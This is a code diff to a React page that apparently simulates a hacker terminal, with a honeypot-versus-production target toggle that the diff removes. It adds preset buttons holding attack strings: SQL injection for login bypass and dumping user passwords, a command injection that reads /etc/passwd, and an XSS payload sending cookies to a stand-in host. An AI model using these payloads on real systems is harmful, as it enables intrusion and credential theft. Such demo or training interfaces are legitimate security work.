@@ -179,22 +179,7 @@ export default function Home() {
             </CardTitle>
           </CardHeader>
           <CardContent className="flex-1 flex flex-col p-4 gap-4">
-            <div className="flex gap-2 bg-green-950/20 p-1 rounded border border-green-900">
-              <Button
-                variant={target === 'honeypot' ? 'destructive' : 'ghost'}
-                onClick={() => setTarget('honeypot')}
-                className={`w-1/2 rounded-none font-mono ${target === 'honeypot' ? 'bg-red-900 text-red-200 border border-red-500' : 'text-green-700 hover:text-green-400'}`}
-              >
-                TARGET: TRAP
-              </Button>
-              <Button
-                variant={target === 'prod' ? 'default' : 'ghost'}
-                onClick={() => setTarget('prod')}
-                className={`w-1/2 rounded-none font-mono ${target === 'prod' ? 'bg-green-900 text-green-200 border border-green-500' : 'text-green-700 hover:text-green-400'}`}
-              >
-                TARGET: PROD
-              </Button>
-            </div>
+            <div className="hidden"></div>
 
             <ScrollArea className="flex-1 bg-black rounded border border-green-800 p-4 font-mono text-xs text-green-400">
               {terminalOutput.map((line, i) => (
@@ -223,14 +208,28 @@ export default function Home() {
                 className="cursor-pointer hover:bg-green-900 text-green-600 border-green-800 transition-colors font-mono rounded-none"
                 onClick={() => setCommand("ADMIN' OR '1'='1' --")}
               >
-                Auth_Bypass_v1
+                Auth_Bypass
               </Badge>
               <Badge
                 variant="outline"
                 className="cursor-pointer hover:bg-green-900 text-green-600 border-green-800 transition-colors font-mono rounded-none"
-                onClick={() => setCommand("<script>alert('pwned')</script>")}
+                onClick={() => setCommand("; cat /etc/passwd")}
               >
-                XSS_Payload
+                RCE_Exploit
+              </Badge>
+              <Badge
+                variant="outline"
+                className="cursor-pointer hover:bg-green-900 text-green-600 border-green-800 transition-colors font-mono rounded-none"
+                onClick={() => setCommand("' UNION SELECT 1, username, password, role FROM users --")}
+              >
+                DB_Dump
+              </Badge>
+              <Badge
+                variant="outline"
+                className="cursor-pointer hover:bg-green-900 text-green-600 border-green-800 transition-colors font-mono rounded-none"
+                onClick={() => setCommand("<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>")}
+              >
+                XSS_Infect
               </Badge>
               <Badge
                 variant="outline"
@@ -238,7 +237,7 @@ export default function Home() {
                 onClick={() => {
                   setCommand("admin")
                   setPassword("7c4a8d09ca3762af61e59520943dc26494f8941b")
-                  setTarget('prod') // Automatically switch to PROD target for the login attempt
+                  setTarget('prod')
                 }}
               >
                 Use_Stolen_Creds
